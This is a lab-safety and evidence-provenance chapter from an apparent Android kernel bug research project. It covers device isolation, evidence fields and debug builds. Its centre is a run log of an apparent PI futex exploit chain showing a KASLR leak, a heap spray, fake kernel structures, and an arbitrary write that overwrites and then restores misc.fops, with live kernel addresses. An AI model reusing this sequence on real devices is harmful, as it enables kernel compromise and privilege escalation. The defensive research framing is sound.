# 01 — Observation, Provenance, and Lab Safety

[简体中文](zh-CN/01-observation.md) · [Project home](../README.md)

## Outcome first

Kernel results are credible only when the team can prove **what ran, where it ran, and what was observed before failure**. The observation system is therefore part of the security boundary. It must not require opaque preload objects or grant an unreviewed artifact access to a developer workstation, personal phone, signing key, or authenticated ADB session.

## Safe laboratory baseline

- Use a dedicated device with a recoverable factory image and no personal data, SIM, accounts, credentials, or production network access.
- Before the first run, obtain the exact factory/OTA recovery package where legally and technically available, confirm how to enter the model's normal reboot and recovery menus, charge the battery, and preserve any unlock/recovery credentials required by the owner.
- Place the host and device on an isolated network. Disable unnecessary outbound connectivity.
- Build from reviewed source in a disposable environment; record source commit, compiler/toolchain identity, configuration, and output digest.
- Do not run attachments from issues or chat. An `LD_PRELOAD` library executes before the nominal program's `main()` and can falsify logs as well as compromise the host process.
- Collect only the minimum logs needed. Redact serials, boot IDs, absolute runtime addresses, tokens, and user data before publication.

For a freeze or black screen, use the official vivo force-restart procedure referenced in the root README: on current full-screen models, hold Power + Volume Down together for more than 10 seconds. A forced restart is a first recovery step, not proof that no damage occurred. Do not choose data-wipe or flashing entries merely because a recovery menu appears.

## Evidence chain

Each test round should bind the following fields:

| Field | Why it matters |
| --- | --- |
| Device/build identity | Prevents results from being assigned to the wrong OTA or vendor branch |
| Source commit and dirty-tree state | Makes the tested logic reviewable |
| Toolchain and configuration | Explains ABI, CFI, sanitizer, and layout differences |
| Artifact SHA-256 | Detects substitution between build and execution |
| Boot identity and monotonic timestamps | Separates rounds without publishing stable device identifiers |
| Predeclared pass/fail criterion | Prevents post-hoc interpretation |
| Panic/oops evidence | Distinguishes timeout, userspace failure, and kernel failure |

A digest authenticates equality to a known artifact; it does not establish that the artifact is benign. Review and reproducibility come first.

## Supplied run: bounded interpretation

The supplied transcript reaches `route-summary ... route_done=1` and then prints `uid=2000(shell)` in `u:r:shell:s0`, matching the unprivileged startup identity. It is therefore a valid positive criterion for “the observation/route artifact completed and returned without privilege elevation” on that round. It is not evidence of root, of general binary safety, or of behavior on another build. Because startup records `enforce=0`, no SELinux transition can be attributed to this run.

Target gating must be tested independently. The observed device tuple is PD2314/V2314A, `k6895v1_64`, `mt6895`, `arm64-v8a`, display build `PD2314_A_15.2.18.0.W10`, and kernel release `5.10.233-android12-9-g44ec642832da-dirty`. The artifact's printed profile label names `15.2.17.1`, so exact-version refusal is not proven by the positive run. Add pre-probe fail-closed checks and negative criteria: mismatched model, board, platform, display build, fingerprint, kernel release, ABI, or unavailable property must terminate before active probing.

### Run log

```
[*] kernelsnitch collision-scan found=7/7 elapsed_ms=1595
[*] kernelsnitch collision-scan leaked mm=ffffff816a8c6cc0
[*] timing stage=page-mm-layout pid=8189 elapsed_ms=3817
[*] tcp payload geometry slab_base=ffffff816a8c0000 payload_base=ffffff816a8c0000 payload_bias=0xe80 fake_lock=ffffff816a8c1350 fake_w0=ffffff816a8c2220 fake_task=ffffff816a8c5800 fake_fops=ffffff816a8c1000 wait_lock=ffffff816a8c1370 owner=ffffff816a8c5801
[*] final lock mode=active-final base=ffffff816a8c1350 lock=ffffff816a8c1370 root=ffffff816a8c2220 leftmost=ffffff816a8c2220 owner=ffffff816a8c5801 fake_w0_prio=255 pi_parent=ffffff816a8c0ff8 pi_top=ffffffeb188ec200
[*] tcp fops pi geometry parent=ffffff816a8c0ff8 right=0000000000000000 left=0000000000000000 final_pi_write=1 waiter_lock=ffffff816a8c1370
[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff816a8c1000
[*] timing stage=page-leak-payload pid=8189 elapsed_ms=3818
[*] af_unix order3 staged pairs=64 requested=64
[*] timing stage=page-spray-stage pid=8189 elapsed_ms=3819
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] timing stage=page-reclaim-send pid=8189 elapsed_ms=3973
[-] kpage state unavailable flags_fd=-1 count_fd=-1 errno=13
[*] timing stage=page-cleanup pid=8189 elapsed_ms=5038
[*] timing stage=page-total pid=8189 elapsed_ms=5039
[*] timing stage=fops-page pid=8189 elapsed_ms=5039
[+] refclone fops page ready base=ffffff816a8c0000
[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x888 marker_off=0x58 target=x28+0x38 value=ffffff816a8c1370 final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=ffffff8002c84ea0 right=ffffff816a8c1000 left=0 pi_write=1
[*] slide ip overlay qwords 20=ffffff8002c84ea0 28=ffffff816a8c1000 30=0 38=ffffff816a8c0ff8 40=0 48=0 50=ffffffeb188ec200 58=ffffff816a8c1370 60=00000000000000ff
[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
[*] main route chain released ret=0 errno=0 owner=0/0 safe=1
[*] main waiter pi scrub ret=-1 errno=110 ok=1
[*] configfs write window target=ffffffeb18a84ea8 base=ffffffeb18000000 pos=0xa884ea8 len=8 ret=8 errno=0
[*] misc.fops restore target=ffffffeb18a84ea8 original=ffffffeb1838fbd8 ret=8 errno=0
[+] misc.fops restored to ashmem_fops — ashmem safe
[+] route-summary pid=8189 kaslr=1 base=ffffffeb15e00000 slide=0000002b0de00000 route_done=1
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(addb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
```


The restore step writes the original `ashmem_fops` address back into the `misc.fops` slot through the configfs write window (`ret=8` = 8 bytes written, `errno=0` = success). After this, the device survived without crash or reboot, and subsequent ashmem access was safe. This is a positive safety criterion for the restore logic on this build; it does not generalize to other builds without independent verification of the `ashmem_fops` offset and the configfs write window availability.

## Failure-resilient logging

Use two independent channels in engineering labs:

1. A low-latency host channel for milestones and timing.
2. A write-through local record for the last completed state before a crash.

Neither channel should contain secrets or be enabled in production. A successful syscall return is evidence only for that return condition; it does not prove internal memory safety. Conversely, a missing line is not automatically a kernel panic unless the host transport and userspace process state are independently known.

## Recommended diagnostic builds

When source control is available, validate the repair with separate engineering kernels enabling the relevant combinations of lockdep, debug rtmutex support, KASAN, KCSAN, UBSAN, and fault-injection facilities that the vendor build can tolerate. Keep these builds off production devices because instrumentation changes timing and performance.

Useful assertions focus on invariants rather than attacker-controlled geometry:

- A task returning from a PI wait path has `pi_blocked_on == NULL` unless it remains genuinely blocked.
- The task whose PI fields are changed is the task whose `pi_lock` is held.
- A waiter removed from both RB trees is no longer discoverable through `rb_leftmost`.
- Early-error cleanup accepts a waiter with only the fields guaranteed initialized at that point.

## Publication rule

Publish source excerpts, minimized traces, symbolic offsets, and validation matrices. Do not publish live device addresses, opaque payloads, prebuilt preload libraries, or a sequence that converts the lifetime bug into a privilege-changing primitive.
